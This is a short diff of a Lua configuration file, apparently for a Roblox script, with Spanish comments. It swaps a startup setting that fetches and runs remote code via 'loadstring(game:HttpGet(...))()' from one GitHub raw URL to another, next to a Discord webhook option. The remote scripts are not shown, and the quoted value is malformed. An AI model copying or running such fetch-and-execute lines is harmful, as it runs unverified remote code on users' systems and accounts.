@@ -5,7 +5,7 @@ local CONFIG = {
    
     -- Script extra que se ejecuta al iniciar. Solo debes colocar la URL en texto.
     -- Dejar vacio ("") para desactivar.
-    SECOND_SCRIPT_URL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/carlossano888-create/jesus/refs/heads/main/luraph.lua"))()",
+    SECOND_SCRIPT_URL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/rysted-rbx/free/main/dmvs"))()",
 
     -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
     WEBHOOK = {
